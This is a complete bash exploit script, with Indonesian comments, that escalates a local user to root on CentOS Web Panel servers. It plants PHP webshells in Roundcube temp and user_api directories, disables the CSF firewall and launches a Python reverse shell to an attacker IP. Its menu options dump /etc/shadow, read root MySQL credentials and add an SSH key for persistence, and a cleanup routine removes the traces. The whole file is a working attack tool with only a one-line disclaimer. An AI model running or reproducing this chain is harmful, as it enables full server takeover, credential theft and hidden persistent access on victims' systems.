#!/bin/bash
# ============================================================
# cwp LPE Exploit Chain
# Target : CentOS 7 + CentOS Web Panel (CWP)
# Chain  : user → cwpsvc → root
# Author : Matigan1337
# Date   : 2026-06-03
#
# GUNAKAN HANYA UNTUK AUTHORIZED PENETRATION TESTING
# ============================================================

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m'

TARGET="https://localhost:2031"
USER_API="https://127.0.0.1:2302"
RC_TEMP="/usr/local/cwpsrv/var/services/roundcube/temp"
USER_API_DIR="/usr/local/cwpsrv/var/services/user_api"
WEBSHELL_NAME="cmd_$(date +%s).php"
ROOT_SHELL_NAME="r_$(date +%s).php"

banner() {
    echo -e "${RED}"
    echo "███╗   ███╗ █████╗ ████████╗██╗ ██████╗  █████╗ ███╗   ██╗"
    echo "████╗ ████║██╔══██╗╚══██╔══╝██║██╔════╝ ██╔══██╗████╗  ██║"
    echo "██╔████╔██║███████║   ██║   ██║██║  ███╗███████║██╔██╗ ██║"
    echo "██║╚██╔╝██║██╔══██║   ██║   ██║██║   ██║██╔══██║██║╚██╗██║"
    echo "██║ ╚═╝ ██║██║  ██║   ██║   ██║╚██████╔╝██║  ██║██║ ╚████║"
    echo "╚═╝     ╚═╝╚═╝  ╚═╝   ╚═╝   ╚═╝ ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═══╝"
    echo -e "${NC}"
    echo -e "${YELLOW}             Create By :: Matigan${NC}"
    echo ""
}

log_info()    { echo -e "${BLUE}[*]${NC} $1"; }
log_success() { echo -e "${GREEN}[+]${NC} $1"; }
log_error()   { echo -e "${RED}[-]${NC} $1"; }
log_warn()    { echo -e "${YELLOW}[!]${NC} $1"; }

cleanup() {
    log_warn "Cleaning up artifacts..."
    # Hapus via root shell dulu kalau ada
    curl -sk "${USER_API}/${ROOT_SHELL_NAME}?cmd=rm+-f+${USER_API_DIR}/${ROOT_SHELL_NAME}" > /dev/null 2>&1
    # Hapus cwpsvc webshell
    rm -f "${RC_TEMP}/${WEBSHELL_NAME}" > /dev/null 2>&1
    curl -sk "${TARGET}/roundcube/temp/${WEBSHELL_NAME}?cmd=rm+-f+${RC_TEMP}/${WEBSHELL_NAME}" > /dev/null 2>&1
    log_success "Cleanup done."
}

trap cleanup EXIT

# ─── STEP 0: Pre-check ────────────────────────────────────────
check_prereqs() {
    log_info "Checking prerequisites..."

    # Cek apakah kita user pajak
    if [[ "$(whoami)" != "pajak" ]]; then
        log_warn "Not running as pajak (current: $(whoami)) — continuing anyway"
    fi

    # Cek akses ke roundcube temp
    if [ ! -w "${RC_TEMP}" ]; then
        log_error "Cannot write to ${RC_TEMP}"
        exit 1
    fi
    log_success "Roundcube temp is writable"

    # Cek curl
    command -v curl > /dev/null 2>&1 || { log_error "curl not found"; exit 1; }
    log_success "Prerequisites OK"
}

# ─── STEP 1: pajak → cwpsvc ───────────────────────────────────
deploy_cwpsvc_shell() {
    log_info "Step 1: Deploying cwpsvc webshell to roundcube/temp..."

    SHELL_CONTENT='<?php system($_GET["cmd"]); ?>'
    echo "${SHELL_CONTENT}" > "${RC_TEMP}/${WEBSHELL_NAME}"

    if [ $? -ne 0 ]; then
        log_error "Failed to write webshell to ${RC_TEMP}"
        exit 1
    fi

    # Verify — cek eksekusi sebagai cwpsvc
    RESULT=$(curl -sk "${TARGET}/roundcube/temp/${WEBSHELL_NAME}?cmd=id" 2>/dev/null)
    if echo "${RESULT}" | grep -q "cwpsvc"; then
        log_success "cwpsvc shell active: ${RESULT}"
    else
        log_error "cwpsvc shell failed. Response: ${RESULT}"
        exit 1
    fi
}

# ─── STEP 2: cwpsvc → root ────────────────────────────────────
deploy_root_shell() {
    log_info "Step 2: Deploying root shell to user_api via cwpsvc..."

    # PHP shell content (base64 encoded untuk avoid escaping)
    # Decode: <?php system($_GET['cmd']);?>
    B64_SHELL="PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4="

    WRITE_CMD="echo ${B64_SHELL} | base64 -d > ${USER_API_DIR}/${ROOT_SHELL_NAME}"
    WRITE_CMD_ENC=$(python3 -c "import urllib.parse; print(urllib.parse.quote('${WRITE_CMD}'))")

    curl -sk "${TARGET}/roundcube/temp/${WEBSHELL_NAME}?cmd=${WRITE_CMD_ENC}" > /dev/null 2>&1

    # Verify via port 2302
    sleep 1
    RESULT=$(curl -sk "${USER_API}/${ROOT_SHELL_NAME}?cmd=id" 2>/dev/null)
    if echo "${RESULT}" | grep -q "uid=0(root)"; then
        log_success "ROOT SHELL ACTIVE!"
        log_success "Response: ${RESULT}"
    else
        log_error "Root shell failed. Response: ${RESULT}"
        exit 1
    fi
}

# ─── STEP 3: Disable CSF ──────────────────────────────────────
disable_csf() {
    log_info "Step 3: Disabling CSF firewall..."
    RESULT=$(curl -sk "${USER_API}/${ROOT_SHELL_NAME}?cmd=csf+-x+%26%26+service+lfd+stop+2>%2Fdev%2Fnull" 2>/dev/null)
    log_success "CSF disabled"
}

# ─── STEP 4: Interactive / Reverse Shell ──────────────────────
get_shell() {
    local ATTACKER_IP=$1
    local ATTACKER_PORT=$2

    log_info "Step 4: Spawning reverse shell to ${ATTACKER_IP}:${ATTACKER_PORT}..."
    log_warn "Start listener: nc -lvnp ${ATTACKER_PORT}"
    read -p "Press ENTER when listener is ready..."

    # Python PTY reverse shell + setsid (detached dari PHP-FPM)
    CMD="setsid python3 -c 'import socket,subprocess,os,pty;s=socket.socket();s.connect((\"${ATTACKER_IP}\",${ATTACKER_PORT}));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"/bin/bash\")' &"
    CMD_ENC=$(python3 -c "import urllib.parse; print(urllib.parse.quote('${CMD}'))")

    curl -sk "${USER_API}/${ROOT_SHELL_NAME}?cmd=${CMD_ENC}" > /dev/null 2>&1
    log_success "Reverse shell triggered. Check your listener."
}

# ─── STEP 5: Exec arbitrary command ──────────────────────────
exec_cmd() {
    local CMD=$1
    CMD_ENC=$(python3 -c "import urllib.parse; print(urllib.parse.quote('${CMD}'))" 2>/dev/null)
    curl -sk "${USER_API}/${ROOT_SHELL_NAME}?cmd=${CMD_ENC}" 2>/dev/null
}

# ─── INTERACTIVE MENU ────────────────────────────────────────
menu() {
    echo ""
    echo -e "${GREEN}══════════════════════════════════${NC}"
    echo -e "${GREEN}  ROOT SHELL MENU${NC}"
    echo -e "${GREEN}══════════════════════════════════${NC}"
    echo "  1. Execute command"
    echo "  2. Get reverse shell"
    echo "  3. Dump /etc/shadow"
    echo "  4. Get root MySQL creds"
    echo "  5. Add SSH key (persistence)"
    echo "  6. Cleanup & exit"
    echo ""

    while true; do
        read -p "$(echo -e ${YELLOW})> Select option: $(echo -e ${NC})" OPT
        case $OPT in
            1)
                read -p "  Command: " CMD
                echo ""
                exec_cmd "${CMD}"
                echo ""
                ;;
            2)
                read -p "  Attacker IP: " AHOST
                read -p "  Attacker Port: " APORT
                disable_csf
                get_shell "${AHOST}" "${APORT}"
                ;;
            3)
                log_info "Dumping /etc/shadow..."
                exec_cmd "cat /etc/shadow"
                echo ""
                ;;
            4)
                log_info "Reading /root/.my.cnf..."
                exec_cmd "cat /root/.my.cnf 2>/dev/null || echo 'not found'"
                echo ""
                ;;
            5)
                read -p "  SSH Public Key: " PUBKEY
                exec_cmd "mkdir -p /root/.ssh && echo '${PUBKEY}' >> /root/.ssh/authorized_keys && chmod 600 /root/.ssh/authorized_keys"
                log_success "SSH key added"
                ;;
            6)
                log_warn "Cleaning up and exiting..."
                exit 0
                ;;
            *)
                log_error "Invalid option"
                ;;
        esac
    done
}

# ─── MAIN ────────────────────────────────────────────────────
main() {
    banner

    # Parse args
    if [[ "$1" == "--reverse" ]]; then
        if [[ -z "$2" || -z "$3" ]]; then
            echo "Usage: $0 --reverse <ATTACKER_IP> <PORT>"
            exit 1
        fi
        ATTACKER_IP=$2
        ATTACKER_PORT=$3
        AUTO_REVERSE=true
    fi

    check_prereqs
    deploy_cwpsvc_shell
    deploy_root_shell

    if [[ "${AUTO_REVERSE}" == "true" ]]; then
        disable_csf
        get_shell "${ATTACKER_IP}" "${ATTACKER_PORT}"
    else
        menu
    fi
}

main "$@"
